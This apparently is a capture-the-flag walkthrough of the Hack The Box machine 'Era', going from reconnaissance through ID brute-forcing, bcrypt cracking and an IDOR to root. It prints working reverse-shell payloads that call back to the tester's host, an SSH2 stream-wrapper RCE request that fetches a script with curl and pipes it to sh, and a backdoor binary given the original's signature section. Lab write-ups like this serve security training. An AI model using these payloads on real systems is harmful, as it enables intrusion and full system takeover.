---
title: Era — HTB
author: Radeel Ahmad
pubDatetime: 2025-07-30T15:44:00Z
tags:
  - hacking
  - HTB
  - IDOR
  - PHP
description:
  Hack The Box "Era" walkthrough — brute-forcing sequential file-download IDs, cracking leaked bcrypt hashes from a SQLite DB, an IDOR in reset.php to hijack the admin's security question, an SSH2 stream-wrapper RCE in download.php, and a signature-bypass backdoor in a monitoring binary for root.
---

### Era — HTB

In this article, I will provide a step-by-step guide to solve the Hack The Box machine '**Era**'.

![](/blog/images/htb/1*N9uBLB7o1fF4pUkbcJYJiQ.png)

Nmap Scan:

```
┌──(kali㉿kali)-[~/Desktop/HTB/Era]
└─$ nmap -sV -sC -A 10.10.11.79
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-30 15:44 UTC
Nmap scan report for 10.10.11.79
Host is up (0.24s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://era.htb/
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

```
TRACEROUTE (using port 1720/tcp)
HOP RTT       ADDRESS
1   240.71 ms 10.10.14.1
2   241.92 ms 10.10.11.79

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.75 seconds
```

Now update `/etc/hosts`:

```
10.10.11.79 era.htb
```

![](/blog/images/htb/1*xqFXTyd4psSE3YO-A4p3Sg.png)

Perform directory busting:

```
┌──(kali㉿kali)-[~/Desktop/HTB/Era]
└─$ dirsearch -u era.htb -t 50 -i 200,301
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict
```

```
_|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460
Output File: /home/kali/Desktop/HTB/Era/reports/_era.htb/_25-07-30_15-54-33.txt
Target: http://era.htb/
[15:54:33] Starting:
[15:54:37] 301 -  178B  - /js  ->  http://era.htb/js/
[15:55:29] 301 -  178B  - /css  ->  http://era.htb/css/
[15:55:44] 301 -  178B  - /fonts  ->  http://era.htb/fonts/
[15:55:50] 301 -  178B  - /img  ->  http://era.htb/img/

Task Completed
```

Find the subdomain:

```
┌──(kali㉿kali)-[~/Desktop/HTB/Era]
└─$ wfuzz -c -w /usr/share/dnsrecon/dnsrecon/data/subdomains-top1mil-20000.txt  -H "Host: FUZZ.era.htb" --sc 200 http://era.htb/
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************
```

```
Target: http://era.htb/
Total requests: 20000
=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================
000000312:   200        233 L    559 W      6765 Ch     "file"
```

Now update `/etc/hosts`:

```
10.10.11.79 file.era.htb
```

After running dirsearch, we discovered another endpoint: `register.php`.

```
┌──(kali㉿kali)-[~/Desktop/HTB/Era]
└─$ dirsearch -u file.era.htb -t 50 -i 200,301,302
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict
```

```
_|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460
Output File: /home/kali/Desktop/HTB/Era/reports/_file.era.htb/_25-07-30_15-58-42.txt
Target: http://file.era.htb/
[15:58:43] Starting:
[15:59:34] 301 -  178B  - /assets  ->  http://file.era.htb/assets/
[15:59:54] 302 -    0B  - /download.php  ->  login.php
[16:00:02] 301 -  178B  - /files  ->  http://file.era.htb/files/
[16:00:14] 301 -  178B  - /images  ->  http://file.era.htb/images/
[16:00:19] 200 -   34KB - /LICENSE
[16:00:20] 200 -    9KB - /login.php
[16:00:21] 200 -   70B  - /logout.php
[16:00:21] 302 -    0B  - /manage.php  ->  login.php
[16:00:40] 200 -    3KB - /register.php
[16:00:56] 302 -    0B  - /upload.php  ->  login.php

Task Completed
```

```
http://file.era.htb/register.php
```

![](/blog/images/htb/1*lKrBk2AbLOWFko0Ko0EWhg.png)

After registering, the user is redirected to `login.php`.

![](/blog/images/htb/1*pQAXMXQrK1fEDT0ABU7BsQ.png)

Here, we upload a file. Let's try uploading a normal file and observe its behavior.

![](/blog/images/htb/1*0OaRjUdY2yHd1Rf-54XWZg.png)

It gives us the **download link**.

![](/blog/images/htb/1*Lxc7ULwfFQ2wY3_Kjk4ZgA.png)

Capture the download request.

![](/blog/images/htb/1*KpeGE-vaFa3SgEuCE5o6mQ.png)

```
seq 1 10000 > id.txt
```

After running `wfuzz`, we found 3 valid IDs:

- 54
- 150
- 1440

```
┌──(kali㉿kali)-[~/Desktop/HTB/Era]
└─$ffuf -u http://file.era.htb/download.php?id=FUZZ -w id.txt -H "Cookie: PHPSESSID=60m7g5v6o6ndnh30ncjqqqfrea" -mc 200 -fw 3161
```

```
/'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/
       v2.1.0-dev
________________________________________________
 :: Method           : GET
 :: URL              : http://file.era.htb/download.php?id=FUZZ
 :: Wordlist         : FUZZ: /home/kali/Desktop/HTB/Era/id.txt
 :: Header           : Cookie: PHPSESSID=60m7g5v6o6ndnh30ncjqqqfrea
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
 :: Filter           : Response words: 3161
________________________________________________
54                      [Status: 200, Size: 6378, Words: 2552, Lines: 222, Duration: 269ms]
150                     [Status: 200, Size: 6366, Words: 2552, Lines: 222, Duration: 285ms]
1440                    [Status: 200, Size: 6363, Words: 2552, Lines: 222, Duration: 237ms]
:: Progress: [10000/10000] :: Job [1/1] :: 170 req/sec :: Duration: [0:01:28] :: Errors: 0 ::
http://file.era.htb/download.php?id=54
http://file.era.htb/download.php?id=150
```

We download both files

![](/blog/images/htb/1*8lrOCdv-Qiafwv0ZO5Q0aA.png)

Here we found a `filedb.sqlite`

Using `sqlite3`, we access the database and find stored hashes in the `user` table.

```
sqlite3 filedb.sqlite
.tables
select * from users;
```

```
┌──(kali㉿kali)-[~/Desktop/HTB/Era]
└─$ sqlite3 filedb.sqlite
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
files  users
sqlite> select * from users;
1|admin_ef01cab31aa|$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPC|600|Maria|Oliver|Ottawa
2|eric|$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm|-1|||
3|veronica|$2y$10$xQmS7JL8UT4B3jAYK7jsNeZ4I.YqaFFnZNA/2GCxLveQ805kuQGOK|-1|||
4|yuri|$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.|-1|||
5|john|$2a$10$iccCEz6.5.W2p7CSBOr3ReaOqyNmINMH1LaqeQaL22a1T1V/IddE6|-1|||
6|ethan|$2a$10$PkV/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC|-1|||
sqlite>
```

Store the hash into the file and after cracking the hashes, we found two passwords

```
┌──(kali㉿kali)-[~/Desktop/HTB/Era]
└─$ cat hash
$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPC
$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm
$2y$10$xQmS7JL8UT4B3jAYK7jsNeZ4I.YqaFFnZNA/2GCxLveQ805kuQGOK
$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.
$2a$10$iccCEz6.5.W2p7CSBOr3ReaOqyNmINMH1LaqeQaL22a1T1V/IddE6
$2a$10$PkV/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC
```

```
┌──(kali㉿kali)-[~/Desktop/HTB/Era]
└─$ john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

#### Credentials

yuri: `mustang`

eric: `america`

#### Analyze reset.php

Insecure Direct Object Reference (IDOR)

```
$username = trim($_POST['username'] ?? '');
```

> This lets a user change any user's security questions, not just their own.

This user can now update the security question for any account. So, we update the security question for the user `admin_ef01cab31aa` found in the database file.

![](/blog/images/htb/1*6mGRY3GRmEEuaKwCnaqWsQ.png)

Signout

![](/blog/images/htb/1*5mt26Ay4vzhw3Gc2eED7bg.png)

Now **login using security question**

![](/blog/images/htb/1*IVc7yrFt29DBzAy0Ablsyw.png)

![](/blog/images/htb/1*yEegcXffjoinDjPyeSRrAw.png)

#### Analyze Download.php

The `download.php` code contains unsafe usage of PHP stream wrappers when `show=true` and the user is an admin (`$_SESSION['erauser'] === 1`).

#### Reverse Shell

We create a `shell.sh` in local machine:

```
mkfifo /tmp/s; /bin/sh </tmp/s | nc 10.10.14.164 4444 >/tmp/s; rm /tmp/s
```

Then, set up the Python HTTP server

```
python3 -m http.server 80
```

Netcat listener:

```
nc -lvnp 4444
```

Capture the download request and send the intercepted request to the Repeater tab.

![](/blog/images/htb/1*F1ci8r-9PDPKNGSOoemZmg.png)

Append the following payload:

```
GET /download.php?id=150&show=true&format=ssh2.exec%3a//eric%3aamerica%40127.0.0.1/curl+-s+http%3a//10.10.14.164/shell.sh|sh%3b
```

![](/blog/images/htb/1*Cmj0khGMteiwaQkZITnV7g.png)

```
┌──(kali㉿kali)-[~/Desktop/HTB/Era]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.164] from (UNKNOWN) [10.10.11.79] 47604
```

```
ls
user.txt
cat user.txt
d1c872ead6b7522***************
```

---

### Privilege Escalation

After running **linpeas** we can see an interesting thing

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
eric@era:~$ls
ls
user.txt
eric@era:~$cd /opt/AV/periodic-checks
cd /opt/AV/periodic-checks
eric@era:/opt/AV/periodic-checks$ls
ls
monitor  status.log
eric@era:/opt/AV/periodic-checks$
```

After analyzing the binary, we found a great way to become root using a backdoor.

```
eric@era:/tmps$ printf '#include <stdlib.h>\n\nint main() {\n system("/bin/bash -c '\''bash -i >& /dev/tcp/10.10.14.164/4444 0>&1'\''");\n return 0;\n}\n' > backdoor.c
eric@era:/tmp$ gcc -static -o monitor_backdoor backdoor.c
eric@era:/tmp$ objcopy --dump-section .text_sig=sig /opt/AV/periodic-checks/monitor
eric@era:/tmp$ objcopy --add-section .text_sig=sig monitor_backdoor
eric@era:/tmp$ cp monitor_backdoor /opt/AV/periodic-checks/monitor
eric@era:/tmp$
eric@era:/tmp$
```

On the Listener.

```
┌──(kali㉿kali)-[~/Desktop/HTB/Era]
└─$nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.164] from (UNKNOWN) [10.10.11.79] 60558
bash: cannot set terminal process group (6009): Inappropriate ioctl for device
bash: no job control in this shell
root@era:~# ls
ls
answers.sh
clean_monitor.sh
initiate_monitoring.sh
monitor
root.txt
text_sig_section.bin
root@era:~# cat root.txt
cat root.txt
e1dd272b2f94f1035f*********
root@era:~#
```

---

**Thank You** for reading this article. I hope that you have found this information provided to be valuable and helpful. Use it for educational purposes only…. 🙂

**RADEEL AHMAD**
